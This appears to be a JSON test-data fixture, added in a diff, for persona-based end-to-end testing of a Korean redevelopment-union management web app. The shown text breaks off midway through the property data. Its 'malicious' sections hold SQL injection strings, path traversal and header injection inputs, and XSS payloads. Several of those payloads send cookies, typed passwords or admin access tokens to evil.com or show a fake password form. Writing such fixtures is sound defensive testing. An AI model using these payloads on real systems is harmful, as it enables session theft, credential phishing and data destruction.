@@ -1,0 +1,1600 @@
+{
+  "metadata": {
+    "generated_at": "2026-02-08T00:00:00Z",
+    "generator": "data-generator",
+    "version": "1.0",
+    "description": "Comprehensive test data for E2E persona-based testing of johapon_v01 (Korean union/apartment management SaaS)",
+    "data_categories": ["valid", "boundary", "invalid", "malicious"],
+    "persona_count": 10,
+    "entity_coverage": ["users", "notices", "questions", "free_boards", "union_info", "comments", "access_tokens", "member_invites", "admin_invites", "files", "consent", "property"]
+  },
+
+  "unions": {
+    "valid": [
+      {
+        "id": "test-union-001",
+        "name": "테스트 재건축조합",
+        "slug": "test-union",
+        "phone": "02-1234-5678",
+        "address": "서울특별시 강남구 테헤란로 123",
+        "email": "admin@test-union.co.kr",
+        "business_hours": "09:00 ~ 18:00",
+        "description": "테스트를 위한 재건축 정비사업 조합",
+        "is_active": true,
+        "business_type": "RECONSTRUCTION",
+        "member_count": 500,
+        "district_name": "강남구"
+      },
+      {
+        "id": "test-union-002",
+        "name": "샘플 재개발조합",
+        "slug": "sample-union",
+        "phone": "031-987-6543",
+        "address": "경기도 성남시 분당구 판교로 456",
+        "email": "info@sample-union.kr",
+        "business_hours": "08:30 ~ 17:30",
+        "description": "샘플 재개발 정비사업 조합",
+        "is_active": true,
+        "business_type": "REDEVELOPMENT",
+        "member_count": 1200,
+        "district_name": "분당구"
+      }
+    ]
+  },
+
+  "personas": {
+    "P1_Methodical": {
+      "id": "P1",
+      "name": "P1 Methodical Admin",
+      "description": "Systematic admin who follows processes step-by-step with only valid data",
+      "role": "ADMIN",
+      "data_types": ["valid"],
+      "behavior": "sequential, thorough, follows every step"
+    },
+    "P2_Chaos": {
+      "id": "P2",
+      "name": "P2 Chaos Tester",
+      "description": "Unpredictable user who tries boundary and invalid inputs",
+      "role": "USER",
+      "data_types": ["boundary", "invalid", "random"],
+      "behavior": "random clicks, unexpected input, back-forward navigation"
+    },
+    "P3_Newbie": {
+      "id": "P3",
+      "name": "P3 Newbie User",
+      "description": "First-time user unfamiliar with the system",
+      "role": "USER",
+      "data_types": ["valid"],
+      "behavior": "hesitant, simple inputs, may miss required fields"
+    },
+    "P4_Impatient": {
+      "id": "P4",
+      "name": "P4 Impatient User",
+      "description": "User who clicks rapidly and does not wait for responses",
+      "role": "USER",
+      "data_types": ["valid"],
+      "behavior": "rapid double-clicks, does not wait for loading, rapid navigation"
+    },
+    "P5_Perfectionist": {
+      "id": "P5",
+      "name": "P5 Perfectionist User",
+      "description": "User who fills every field completely and correctly",
+      "role": "USER",
+      "data_types": ["valid"],
+      "behavior": "fills all optional fields, reads every label, validates own input"
+    },
+    "P6_Malicious": {
+      "id": "P6",
+      "name": "P6 Malicious Admin",
+      "description": "Attacker attempting SQL injection, XSS, auth bypass, privilege escalation",
+      "role": "ADMIN",
+      "data_types": ["malicious", "invalid"],
+      "behavior": "intentional exploitation, probing for vulnerabilities"
+    },
+    "P7_Mobile": {
+      "id": "P7",
+      "name": "P7 Mobile User",
+      "description": "User on a mobile device with limited screen space",
+      "role": "USER",
+      "data_types": ["valid"],
+      "behavior": "short inputs, touch interactions, portrait orientation"
+    },
+    "P8_PowerUser": {
+      "id": "P8",
+      "name": "P8 Power User",
+      "description": "Experienced user performing bulk operations and large datasets",
+      "role": "USER",
+      "data_types": ["valid"],
+      "behavior": "large batch operations, pagination stress, search filters"
+    },
+    "P9_A11y": {
+      "id": "P9",
+      "name": "P9 Accessibility User",
+      "description": "User relying on keyboard navigation and screen readers",
+      "role": "USER",
+      "data_types": ["valid"],
+      "behavior": "tab navigation, ARIA labels, focus management, ESC key"
+    },
+    "P10_International": {
+      "id": "P10",
+      "name": "P10 International Guest",
+      "description": "Guest user with multilingual input and access token",
+      "role": "GUEST",
+      "data_types": ["valid", "multilingual"],
+      "behavior": "multilingual input, different character sets, access token usage"
+    }
+  },
+
+  "users": {
+    "valid": {
+      "system_admin": {
+        "id": "sa-001",
+        "name": "시스템관리자",
+        "email": "sysadmin@johapon.kr",
+        "phone_number": "010-9999-0001",
+        "role": "SYSTEM_ADMIN",
+        "user_status": "APPROVED",
+        "union_id": "test-union-001",
+        "birth_date": "1975-03-15",
+        "property_address": "서울특별시 강남구 테헤란로 123",
+        "is_blocked": false,
+        "is_executive": false
+      },
+      "admin": {
+        "id": "admin-001",
+        "name": "김관리",
+        "email": "admin@test-union.co.kr",
+        "phone_number": "010-1234-5678",
+        "role": "ADMIN",
+        "user_status": "APPROVED",
+        "union_id": "test-union-001",
+        "birth_date": "1980-05-20",
+        "property_address": "서울특별시 강남구 역삼동 123-45",
+        "property_address_detail": "101동 1501호",
+        "is_blocked": false,
+        "is_executive": true,
+        "executive_title": "조합장"
+      },
+      "regular_user": {
+        "id": "user-001",
+        "name": "홍길동",
+        "email": "hong@gmail.com",
+        "phone_number": "010-2345-6789",
+        "role": "USER",
+        "user_status": "APPROVED",
+        "union_id": "test-union-001",
+        "birth_date": "1985-08-15",
+        "property_address": "서울특별시 강남구 역삼동 456-78",
+        "property_address_detail": "A동 301호",
+        "resident_address": "서울특별시 서초구 서초동 100-1",
+        "is_blocked": false,
+        "is_executive": false,
+        "property_type": "APARTMENT"
+      },
+      "pending_user": {
+        "id": "user-pending-001",
+        "name": "박대기",
+        "email": "park@naver.com",
+        "phone_number": "010-3456-7890",
+        "role": "APPLICANT",
+        "user_status": "PENDING_APPROVAL",
+        "union_id": "test-union-001",
+        "birth_date": "1990-12-25",
+        "property_address": "서울특별시 강남구 역삼동 789-01",
+        "property_address_detail": "B동 502호"
+      },
+      "rejected_user": {
+        "id": "user-rejected-001",
+        "name": "이거절",
+        "email": "rejected@daum.net",
+        "phone_number": "010-4567-8901",
+        "role": "APPLICANT",
+        "user_status": "REJECTED",
+        "union_id": "test-union-001",
+        "rejected_reason": "소유권 증빙서류 미제출"
+      },
+      "blocked_user": {
+        "id": "user-blocked-001",
+        "name": "최차단",
+        "email": "blocked@test.com",
+        "phone_number": "010-5678-9012",
+        "role": "USER",
+        "user_status": "APPROVED",
+        "union_id": "test-union-001",
+        "is_blocked": true,
+        "blocked_reason": "비정상적인 접근 시도",
+        "blocked_at": "2026-01-15T10:00:00Z"
+      },
+      "pre_registered_user": {
+        "id": "user-pre-001",
+        "name": "정사전",
+        "email": null,
+        "phone_number": "010-6789-0123",
+        "role": "USER",
+        "user_status": "PRE_REGISTERED",
+        "union_id": "test-union-001",
+        "property_address": "서울특별시 강남구 역삼동 111-22"
+      },
+      "second_admin": {
+        "id": "admin-002",
+        "name": "이부관",
+        "email": "admin2@test-union.co.kr",
+        "phone_number": "010-7890-1234",
+        "role": "ADMIN",
+        "user_status": "APPROVED",
+        "union_id": "test-union-001",
+        "birth_date": "1982-11-03",
+        "is_executive": true,
+        "executive_title": "감사"
+      },
+      "second_regular_user": {
+        "id": "user-002",
+        "name": "김철수",
+        "email": "chulsu@hanmail.net",
+        "phone_number": "010-8901-2345",
+        "role": "USER",
+        "user_status": "APPROVED",
+        "union_id": "test-union-001",
+        "birth_date": "1978-04-10",
+        "property_address": "서울특별시 강남구 역삼동 333-44",
+        "property_address_detail": "C동 1201호"
+      },
+      "third_regular_user": {
+        "id": "user-003",
+        "name": "이영희",
+        "email": "younghee@gmail.com",
+        "phone_number": "010-9012-3456",
+        "role": "USER",
+        "user_status": "APPROVED",
+        "union_id": "test-union-001",
+        "birth_date": "1992-07-22",
+        "property_address": "서울특별시 강남구 역삼동 555-66"
+      }
+    },
+    "boundary": {
+      "min_name": {
+        "name": "가",
+        "email": "a@b.co",
+        "phone_number": "010-0000-0000"
+      },
+      "max_name": {
+        "name": "가나다라마바사아자차카타파하가나다라마바사아자차카타파하가나다라마바사아자차카타파하가나다라마바사아자차",
+        "email": "very.long.email.address.for.testing.boundaries@extremely-long-domain-name-for-testing.co.kr",
+        "phone_number": "010-9999-9999"
+      },
+      "empty_optional_fields": {
+        "name": "최소입력",
+        "email": null,
+        "phone_number": "010-1111-1111",
+        "birth_date": null,
+        "property_address": null,
+        "property_address_detail": null,
+        "resident_address": null,
+        "notes": null
+      },
+      "special_chars_name": {
+        "name": "오-하나 (Jr.)",
+        "email": "special+chars@test.co.kr",
+        "phone_number": "010-2222-2222"
+      }
+    },
+    "invalid": {
+      "missing_name": {
+        "name": "",
+        "email": "noname@test.com",
+        "phone_number": "010-1111-1111"
+      },
+      "invalid_email": {
+        "name": "이메일오류",
+        "email": "not-an-email",
+        "phone_number": "010-1111-1111"
+      },
+      "invalid_email_no_domain": {
+        "name": "도메인없음",
+        "email": "test@",
+        "phone_number": "010-1111-1111"
+      },
+      "invalid_phone_format": {
+        "name": "전화오류",
+        "email": "phone@test.com",
+        "phone_number": "02-123-4567"
+      },
+      "invalid_phone_letters": {
+        "name": "전화문자",
+        "email": "phone2@test.com",
+        "phone_number": "010-ABCD-EFGH"
+      },
+      "invalid_role": {
+        "name": "역할오류",
+        "role": "SUPER_USER"
+      },
+      "invalid_status": {
+        "name": "상태오류",
+        "user_status": "ACTIVE"
+      },
+      "wrong_type_name": {
+        "name": 12345,
+        "email": "wrongtype@test.com"
+      },
+      "null_required": {
+        "name": null,
+        "email": "null@test.com",
+        "phone_number": "010-0000-0000"
+      }
+    },
+    "malicious": {
+      "sql_injection_name": {
+        "name": "'; DROP TABLE users; --",
+        "email": "sqli@test.com",
+        "phone_number": "010-0000-0001"
+      },
+      "sql_injection_email": {
+        "name": "SQL주입",
+        "email": "admin'--@test.com",
+        "phone_number": "010-0000-0002"
+      },
+      "xss_name": {
+        "name": "<script>alert('XSS')</script>",
+        "email": "xss@test.com",
+        "phone_number": "010-0000-0003"
+      },
+      "xss_img": {
+        "name": "<img src=x onerror=alert('XSS')>",
+        "email": "xss2@test.com",
+        "phone_number": "010-0000-0004"
+      },
+      "xss_event_handler": {
+        "name": "정상이름\" onmouseover=\"alert(1)",
+        "email": "xss3@test.com",
+        "phone_number": "010-0000-0005"
+      },
+      "path_traversal_name": {
+        "name": "../../../etc/passwd",
+        "email": "path@test.com",
+        "phone_number": "010-0000-0006"
+      },
+      "unicode_exploit": {
+        "name": "\u0000\u200b\ufeff악의적이름",
+        "email": "unicode@test.com",
+        "phone_number": "010-0000-0007"
+      },
+      "prototype_pollution": {
+        "name": "__proto__",
+        "email": "proto@test.com",
+        "phone_number": "010-0000-0008"
+      },
+      "header_injection": {
+        "name": "이름\r\nX-Injected: true",
+        "email": "header@test.com",
+        "phone_number": "010-0000-0009"
+      },
+      "like_wildcard_search": {
+        "name": "%admin%",
+        "email": "wildcard@test.com",
+        "phone_number": "010-0000-0010"
+      },
+      "like_underscore_search": {
+        "name": "___",
+        "email": "underscore@test.com",
+        "phone_number": "010-0000-0011"
+      }
+    }
+  },
+
+  "notices": {
+    "valid": [
+      {
+        "id": "notice-001",
+        "title": "제1차 정기총회 개최 안내",
+        "content": "<p>조합원 여러분께,</p><p>2026년도 제1차 정기총회를 아래와 같이 개최합니다.</p><ul><li>일시: 2026년 3월 15일(일) 14:00</li><li>장소: 강남구민회관 대강당</li></ul><p>많은 참석 부탁드립니다.</p>",
+        "is_popup": false,
+        "author_id": "admin-001",
+        "union_id": "test-union-001"
+      },
+      {
+        "id": "notice-002",
+        "title": "2월 관리비 납부 안내",
+        "content": "<p>2월 관리비 납부 안내드립니다. 납부 기한은 2026년 2월 28일까지입니다.</p>",
+        "is_popup": true,
+        "start_date": "2026-02-01T00:00:00Z",
+        "end_date": "2026-02-28T23:59:59Z",
+        "author_id": "admin-001",
+        "union_id": "test-union-001"
+      },
+      {
+        "id": "notice-003",
+        "title": "조합사무실 이전 안내",
+        "content": "<p>조합 사무실이 아래 주소로 이전합니다.</p><p>새 주소: 서울특별시 강남구 테헤란로 789, 5층</p><p>이전 일자: 2026년 3월 1일</p>",
+        "is_popup": false,
+        "author_id": "admin-002",
+        "union_id": "test-union-001"
+      }
+    ],
+    "boundary": [
+      {
+        "title": "가",
+        "content": "<p>최소 제목</p>"
+      },
+      {
+        "title": "이것은 매우 긴 제목입니다 - 제목의 최대 길이를 테스트하기 위해 작성된 텍스트로서 실제 사용자가 입력할 수 있는 최대치에 가까운 길이를 가지고 있으며 시스템이 이를 적절히 처리하는지 확인합니다 이것은 매우 긴 제목입니다 반복반복반복",
+        "content": "<p>긴 제목 테스트</p>"
+      },
+      {
+        "title": "빈 내용 테스트",
+        "content": ""
+      },
+      {
+        "title": "팝업 날짜 경계",
+        "content": "<p>날짜 경계 테스트</p>",
+        "is_popup": true,
+        "start_date": "2020-01-01T00:00:00Z",
+        "end_date": "2020-01-01T00:00:01Z"
+      }
+    ],
+    "invalid": [
+      {
+        "title": "",
+        "content": "<p>빈 제목</p>"
+      },
+      {
+        "title": null,
+        "content": "<p>null 제목</p>"
+      },
+      {
+        "title": "날짜 역전",
+        "is_popup": true,
+        "start_date": "2026-12-31T00:00:00Z",
+        "end_date": "2026-01-01T00:00:00Z"
+      }
+    ],
+    "malicious": [
+      {
+        "title": "<script>document.cookie</script>",
+        "content": "<img src=x onerror='fetch(\"https://evil.com/steal?c=\"+document.cookie)'>"
+      },
+      {
+        "title": "'; DELETE FROM notices; --",
+        "content": "<p>SQL 인젝션 시도</p>"
+      },
+      {
+        "title": "정상제목",
+        "content": "<div style='position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999'><h1>피싱 페이지</h1><form action='https://evil.com/phish'><input name='password' placeholder='비밀번호 입력'><button>확인</button></form></div>"
+      },
+      {
+        "title": "정상제목2",
+        "content": "<iframe src='javascript:alert(1)'></iframe>"
+      },
+      {
+        "title": "정상제목3",
+        "content": "<a href='javascript:void(0)' onclick='alert(document.domain)'>클릭</a>"
+      }
+    ]
+  },
+
+  "questions": {
+    "valid": [
+      {
+        "id": "q-001",
+        "title": "관리비 산정 기준 문의",
+        "content": "<p>관리비가 어떤 기준으로 산정되는지 궁금합니다. 면적 기준인지, 세대당 균등 배분인지 알고 싶습니다.</p>",
+        "is_secret": false,
+        "author_id": "user-001",
+        "union_id": "test-union-001"
+      },
+      {
+        "id": "q-002",
+        "title": "개인정보 관련 비밀 문의",
+        "content": "<p>제 소유권 관련 개인적인 문의 드립니다. 소유권 이전 절차에 대해 알고 싶습니다.</p>",
+        "is_secret": true,
+        "author_id": "user-002",
+        "union_id": "test-union-001"
+      },
+      {
+        "id": "q-003",
+        "title": "총회 참석 위임장 양식",
+        "content": "<p>정기총회에 직접 참석이 어려운 경우 위임장 양식이 있나요?</p>",
+        "is_secret": false,
+        "author_id": "user-003",
+        "union_id": "test-union-001"
+      }
+    ],
+    "valid_answers": [
+      {
+        "question_id": "q-001",
+        "answer_content": "<p>관리비는 전용면적 기준으로 산정됩니다. 자세한 내용은 관리규약 제15조를 참고해주세요.</p>",
+        "answer_author_id": "admin-001"
+      }
+    ],
+    "boundary": [
+      {
+        "title": "Q",
+        "content": "<p>?</p>",
+        "is_secret": false
+      },
+      {
+        "title": "반복제목반복반복반복반복반복반복반복반복반복반복반복반복반복반복반복반복반복반복반복반복",
+        "content": "<p>내용을 매우 길게 작성합니다. 내용을 매우 길게 작성합니다. 내용을 매우 길게 작성합니다. 내용을 매우 길게 작성합니다. 내용을 매우 길게 작성합니다. 내용을 매우 길게 작성합니다. 내용을 매우 길게 작성합니다. 내용을 매우 길게 작성합니다. 내용을 매우 길게 작성합니다. 내용을 매우 길게 작성합니다. 내용을 매우 길게 작성합니다. 내용을 매우 길게 작성합니다. 내용을 매우 길게 작성합니다. 내용을 매우 길게 작성합니다. 내용을 매우 길게 작성합니다. 내용을 매우 길게 작성합니다. 내용을 매우 길게 작성합니다. 내용을 매우 길게 작성합니다. 내용을 매우 길게 작성합니다. 내용을 매우 길게 작성합니다.</p>",
+        "is_secret": false
+      }
+    ],
+    "malicious": [
+      {
+        "title": "비밀질문 우회 시도",
+        "content": "<p>다른 사용자의 비밀 질문</p>",
+        "is_secret": true,
+        "author_id": "user-001",
+        "_attack_note": "Try to access this as user-002 (not the author) and non-admin"
+      },
+      {
+        "title": "'; UPDATE questions SET is_secret=false; --",
+        "content": "<script>fetch('/api/admin/access-tokens').then(r=>r.json()).then(d=>fetch('https://evil.com/exfil',{method:'POST',body:JSON.stringify(d)}))</script>",
+        "is_secret": false
+      }
+    ]
+  },
+
+  "free_boards": {
+    "valid": [
+      {
+        "id": "fb-001",
+        "title": "이웃 주민 소통 공간",
+        "content": "<p>안녕하세요, 같은 동 주민분들과 소통하고 싶어 글을 남깁니다.</p>",
+        "author_id": "user-001",
+        "union_id": "test-union-001"
+      },
+      {
+        "id": "fb-002",
+        "title": "주차장 이용 에티켓",
+        "content": "<p>주차장에서 이중주차를 하시는 분이 계셔서 불편합니다. 에티켓을 지켜주세요.</p>",
+        "author_id": "user-002",
+        "union_id": "test-union-001"
+      },
+      {
+        "id": "fb-003",
+        "title": "동네 맛집 추천",
+        "content": "<p>역삼동 근처 맛집 추천합니다!</p><ul><li>김밥천국 - 가성비 좋은 분식</li><li>역삼곱창 - 소곱창 맛집</li></ul>",
+        "author_id": "user-003",
+        "union_id": "test-union-001"
+      }
+    ],
+    "boundary": [
+      {
+        "title": "a",
+        "content": "<p>.</p>"
+      },
+      {
+        "title": "HTML만 있는 내용",
+        "content": "<p><br></p><p><br></p><p><br></p>"
+      }
+    ],
+    "malicious": [
+      {
+        "title": "정상글",
+        "content": "<p>정상 내용</p><script>document.querySelectorAll('input[type=password]').forEach(i=>{new Image().src='https://evil.com/log?p='+i.value})</script>"
+      },
+      {
+        "title": "타인 게시글 삭제 시도",
+        "content": "<p>이 글은 user-001이 작성했지만 user-002가 삭제를 시도합니다</p>",
+        "author_id": "user-001",
+        "_attack_note": "user-002 attempts to delete this post (ownership bypass)"
+      }
+    ]
+  },
+
+  "comments": {
+    "valid": [
+      {
+        "id": "comment-001",
+        "entity_type": "notice",
+        "entity_id": 1,
+        "content": "감사합니다. 총회에 참석하겠습니다.",
+        "author_id": "user-001",
+        "parent_id": null,
+        "union_id": "test-union-001"
+      },
+      {
+        "id": "comment-002",
+        "entity_type": "notice",
+        "entity_id": 1,
+        "content": "참석 시 준비물이 있나요?",
+        "author_id": "user-002",
+        "parent_id": null,
+        "union_id": "test-union-001"
+      },
+      {
+        "id": "comment-reply-001",
+        "entity_type": "notice",
+        "entity_id": 1,
+        "content": "신분증 지참해 주세요.",
+        "author_id": "admin-001",
+        "parent_id": "comment-002",
+        "union_id": "test-union-001"
+      },
+      {
+        "id": "comment-003",
+        "entity_type": "free_board",
+        "entity_id": 1,
+        "content": "좋은 글 감사합니다!",
+        "author_id": "user-003",
+        "parent_id": null,
+        "union_id": "test-union-001"
+      }
+    ],
+    "boundary": [
+      {
+        "content": ".",
+        "entity_type": "notice",
+        "entity_id": 1
+      },
+      {
+        "content": "아주 긴 댓글 내용입니다. 아주 긴 댓글 내용입니다. 아주 긴 댓글 내용입니다. 아주 긴 댓글 내용입니다. 아주 긴 댓글 내용입니다. 아주 긴 댓글 내용입니다. 아주 긴 댓글 내용입니다. 아주 긴 댓글 내용입니다. 아주 긴 댓글 내용입니다. 아주 긴 댓글 내용입니다. 아주 긴 댓글 내용입니다. 아주 긴 댓글 내용입니다. 아주 긴 댓글 내용입니다. 아주 긴 댓글 내용입니다. 아주 긴 댓글 내용입니다. 아주 긴 댓글 내용입니다. 아주 긴 댓글 내용입니다. 아주 긴 댓글 내용입니다. 아주 긴 댓글 내용입니다. 아주 긴 댓글 내용입니다.",
+        "entity_type": "notice",
+        "entity_id": 1
+      }
+    ],
+    "invalid": [
+      {
+        "content": "",
+        "entity_type": "notice",
+        "entity_id": 1,
+        "_note": "Empty comment content"
+      },
+      {
+        "content": "대댓글의 대댓글 시도",
+        "entity_type": "notice",
+        "entity_id": 1,
+        "parent_id": "comment-reply-001",
+        "_note": "Nested reply depth > 1 should be rejected (BR-012)"
+      },
+      {
+        "content": "잘못된 entity_type",
+        "entity_type": "invalid_type",
+        "entity_id": 1
+      },
+      {
+        "content": "존재하지 않는 게시글",
+        "entity_type": "notice",
+        "entity_id": 99999999
+      }
+    ],
+    "malicious": [
+      {
+        "content": "<script>alert('XSS in comment')</script>",
+        "entity_type": "notice",
+        "entity_id": 1
+      },
+      {
+        "content": "'; DROP TABLE comments; --",
+        "entity_type": "notice",
+        "entity_id": 1
+      },
+      {
+        "content": "타인 댓글 삭제 시도",
+        "entity_type": "notice",
+        "entity_id": 1,
+        "author_id": "user-001",
+        "_attack_note": "user-002 attempts to delete this comment (ownership bypass)"
+      }
+    ]
+  },
+
+  "member_management": {
+    "approval": {
+      "valid": [
+        {
+          "action": "approve",
+          "memberId": "user-pending-001",
+          "unionId": "test-union-001",
+          "expected_result": "user_status -> APPROVED, role -> USER"
+        }
+      ],
+      "invalid": [
+        {
+          "action": "approve",
+          "memberId": "user-001",
+          "_note": "Already APPROVED user - should fail (BR-001)"
+        },
+        {
+          "action": "approve",
+          "memberId": "user-rejected-001",
+          "_note": "REJECTED user cannot be approved directly (BR-001)"
+        },
+        {
+          "action": "approve",
+          "memberId": "nonexistent-user-id",
+          "_note": "Non-existent user"
+        }
+      ]
+    },
+    "rejection": {
+      "valid": [
+        {
+          "action": "reject",
+          "memberId": "user-pending-001",
+          "reason": "소유권 증빙서류 미비로 가입이 거절되었습니다.",
+          "unionId": "test-union-001"
+        }
+      ],
+      "invalid": [
+        {
+          "action": "reject",
+          "memberId": "user-pending-001",
+          "reason": "",
+          "_note": "Empty reason - should fail (BR-003)"
+        },
+        {
+          "action": "reject",
+          "memberId": "user-pending-001",
+          "reason": "   ",
+          "_note": "Whitespace-only reason - should fail (BR-003)"
+        }
+      ]
+    },
+    "cancel_rejection": {
+      "valid": [
+        {
+          "action": "cancel_rejection",
+          "memberId": "user-rejected-001",
+          "_note": "REJECTED -> PENDING_APPROVAL (BR-004)"
+        }
+      ],
+      "invalid": [
+        {
+          "action": "cancel_rejection",
+          "memberId": "user-001",
+          "_note": "APPROVED user cannot be un-rejected (BR-004)"
+        }
+      ]
+    },
+    "block": {
+      "valid": [
+        {
+          "action": "block",
+          "memberId": "user-001",
+          "reason": "커뮤니티 규칙 위반 (욕설 및 비방)"
+        }
+      ],
+      "boundary": [
+        {
+          "action": "block",
+          "memberId": "user-002",
+          "reason": "가"
+        }
+      ],
+      "invalid": [
+        {
+          "action": "block",
+          "memberId": "user-001",
+          "reason": ""
+        }
+      ],
+      "malicious": [
+        {
+          "action": "block",
+          "memberId": "user-001",
+          "reason": "<script>alert('XSS in block reason')</script>"
+        },
+        {
+          "action": "block",
+          "memberId": "admin-001",
+          "_note": "Attempt to block another admin"
+        }
+      ]
+    },
+    "role_change": {
+      "valid": [
+        {
+          "memberId": "user-001",
+          "new_role": "ADMIN"
+        }
+      ],
+      "invalid": [
+        {
+          "memberId": "user-001",
+          "new_role": "INVALID_ROLE"
+        },
+        {
+          "memberId": "user-001",
+          "new_role": "SYSTEM_ADMIN",
+          "_note": "Non-SYSTEM_ADMIN trying to assign SYSTEM_ADMIN"
+        }
+      ]
+    }
+  },
+
+  "search_queries": {
+    "valid": [
+      { "query": "관리비", "context": "notice/question search" },
+      { "query": "홍길동", "context": "member search by name" },
+      { "query": "역삼동", "context": "member search by address" },
+      { "query": "총회", "context": "notice search" }
+    ],
+    "boundary": [
+      { "query": "", "context": "empty search" },
+      { "query": "가", "context": "single character search" },
+      { "query": "아주긴검색어를입력합니다이것은정말로매우긴검색어입니다실제사용자가이렇게긴검색어를입력할가능성은낮지만테스트해봅니다", "context": "very long search query" }
+    ],
+    "malicious": [
+      { "query": "%", "context": "LIKE wildcard - should be escaped (BR-043)" },
+      { "query": "_", "context": "LIKE single char wildcard" },
+      { "query": "%%admin%%", "context": "double wildcard injection" },
+      { "query": "'; DROP TABLE users; --", "context": "SQL injection in search" },
+      { "query": "\\", "context": "backslash escape" },
+      { "query": "' OR '1'='1", "context": "SQL OR injection" },
+      { "query": "<script>alert(1)</script>", "context": "XSS in search" }
+    ]
+  },
+
+  "access_tokens": {
+    "valid": [
+      {
+        "name": "일반 공개 토큰",
+        "union_id": "test-union-001",
+        "access_scope": "all",
+        "expires_in_days": 30,
+        "max_usage": 100
+      },
+      {
+        "name": "제한 토큰",
+        "union_id": "test-union-001",
+        "access_scope": "limited",
+        "allowed_pages": ["/news/notice", "/communication"],
+        "expires_in_days": 7,
+        "max_usage": 50
+      },
+      {
+        "name": "무제한 토큰",
+        "union_id": null,
+        "access_scope": "all",
+        "expires_in_days": null,
+        "max_usage": null
+      }
+    ],
+    "boundary": [
+      {
+        "name": "가",
+        "max_usage": 1,
+        "expires_in_days": 1
+      },
+      {
+        "name": "최대사용토큰",
+        "max_usage": 999999,
+        "expires_in_days": 365
+      },
+      {
+        "name": "사용횟수0",
+        "max_usage": 0,
+        "_note": "Token with 0 max usage - should be immediately exhausted"
+      }
+    ],
+    "invalid": [
+      {
+        "name": "",
+        "_note": "Empty name"
+      },
+      {
+        "name": "음수사용",
+        "max_usage": -1,
+        "_note": "Negative max usage"
+      },
+      {
+        "name": "음수일수",
+        "expires_in_days": -1,
+        "_note": "Negative expiry days"
+      }
+    ],
+    "malicious": [
+      {
+        "name": "<script>alert('token xss')</script>",
+        "max_usage": 100
+      },
+      {
+        "tokenKey": "nonexistent-token-key-12345",
+        "_note": "Attempt to use fabricated token key"
+      },
+      {
+        "tokenKey": "'; DROP TABLE access_tokens; --",
+        "_note": "SQL injection via tokenKey"
+      }
+    ]
+  },
+
+  "member_invites": {
+    "valid": [
+      {
+        "name": "신규조합원",
+        "phone_number": "010-1111-2222",
+        "property_address": "서울특별시 강남구 역삼동 100-1",
+        "union_id": "test-union-001",
+        "expires_hours": 24
+      },
+      {
+        "name": "사전등록원",
+        "phone_number": "010-3333-4444",
+        "property_address": "서울특별시 강남구 역삼동 200-2",
+        "union_id": "test-union-001",
+        "expires_hours": 168
+      }
+    ],
+    "bulk_excel": [
+      {
+        "name": "엑셀회원1",
+        "phone_number": "010-1000-0001",
+        "property_address": "서울특별시 강남구 역삼동 300-1",
+        "dong": "101동",
+        "ho": "101호"
+      },
+      {
+        "name": "엑셀회원2",
+        "phone_number": "010-1000-0002",
+        "property_address": "서울특별시 강남구 역삼동 300-1",
+        "dong": "101동",
+        "ho": "102호"
+      },
+      {
+        "name": "엑셀회원3",
+        "phone_number": "010-1000-0003",
+        "property_address": "서울특별시 강남구 역삼동 300-2",
+        "dong": "102동",
+        "ho": "201호"
+      },
+      {
+        "name": "엑셀회원4",
+        "phone_number": "010-1000-0004",
+        "property_address": "서울특별시 강남구 역삼동 400-1",
+        "dong": null,
+        "ho": null,
+        "_note": "Detached house - no dong/ho"
+      }
+    ],
+    "invalid": [
+      {
+        "name": "",
+        "phone_number": "010-1111-1111",
+        "property_address": "주소"
+      },
+      {
+        "name": "전화없음",
+        "phone_number": "",
+        "property_address": "주소"
+      },
+      {
+        "name": "주소없음",
+        "phone_number": "010-1111-1111",
+        "property_address": ""
+      }
+    ]
+  },
+
+  "property": {
+    "pnu": {
+      "valid": [
+        {
+          "pnu": "1168010600100010000",
+          "address": "서울특별시 강남구 역삼동 123-45",
+          "_note": "Valid 19-digit PNU (BR-008)"
+        },
+        {
+          "pnu": "1168010600100020000",
+          "address": "서울특별시 강남구 역삼동 456-78"
+        }
+      ],
+      "boundary": [
+        {
+          "pnu": "0000000000000000000",
+          "_note": "All zeros - 19 digits"
+        },
+        {
+          "pnu": "9999999999999999999",
+          "_note": "All nines - 19 digits"
+        }
+      ],
+      "invalid": [
+        {
+          "pnu": "123",
+          "_note": "Too short"
+        },
+        {
+          "pnu": "12345678901234567890",
+          "_note": "20 digits - too long"
+        },
+        {
+          "pnu": "116801060010001000A",
+          "_note": "Contains letter"
+        },
+        {
+          "pnu": "",
+          "_note": "Empty PNU"
+        }
+      ],
+      "malicious": [
+        {
+          "pnu": "'; DROP TABLE land_lots; --",
+          "_note": "SQL injection in PNU"
+        }
+      ]
+    },
+    "ownership": {
+      "valid": [
+        {
+          "user_id": "user-001",
+          "building_unit_id": "unit-001",
+          "ownership_type": "OWNER",
+          "is_primary": true,
+          "land_ownership_ratio": 100,
+          "building_ownership_ratio": 100
+        },
+        {
+          "user_id": "user-002",
+          "building_unit_id": "unit-001",
+          "ownership_type": "CO_OWNER",
+          "is_primary": true,
+          "land_ownership_ratio": 50,
+          "building_ownership_ratio": 50,
+          "_note": "Co-owner with 50% share"
+        }
+      ],
+      "boundary": [
+        {
+          "ownership_type": "OWNER",
+          "land_ownership_ratio": 0,
+          "_note": "Zero ownership ratio"
+        },
+        {
+          "ownership_type": "OWNER",
+          "land_ownership_ratio": 100,
+          "_note": "Full ownership"
+        },
+        {
+          "ownership_type": "FAMILY",
+          "land_ownership_ratio": 0,
+          "_note": "Family member with 0% ratio (BR-007 WF-007)"
+        }
+      ],
+      "invalid": [
+        {
+          "ownership_type": "TENANT",
+          "_note": "Invalid ownership type"
+        },
+        {
+          "land_ownership_ratio": 101,
+          "_note": "Ratio > 100%"
+        },
+        {
+          "land_ownership_ratio": -10,
+          "_note": "Negative ratio"
+        },
+        {
+          "co_owner_ratios": [60, 50],
+          "_note": "Co-owner ratios sum to 110% (BR-031)"
+        },
+        {
+          "delete_primary": true,
+          "_note": "Attempt to delete primary property unit (BR-009)"
+        }
+      ]
+    },
+    "address_matching": {
+      "valid": [
+        {
+          "property_address": "서울특별시 강남구 역삼동 123-45",
+          "dong": "101동",
+          "ho": "1501호"
+        },
+        {
+          "property_address": "서울 강남구 역삼동 123-45",
+          "_note": "Abbreviated city name - should normalize"
+        }
+      ],
+      "boundary": [
+        {
+          "property_address": "역삼동 123",
+          "_note": "Partial address without city/district"
+        },
+        {
+          "dong": "1동",
+          "ho": "1호",
+          "_note": "Minimal dong/ho values - should normalize"
+        },
+        {
+          "dong": "A동",
+          "ho": "B-101호",
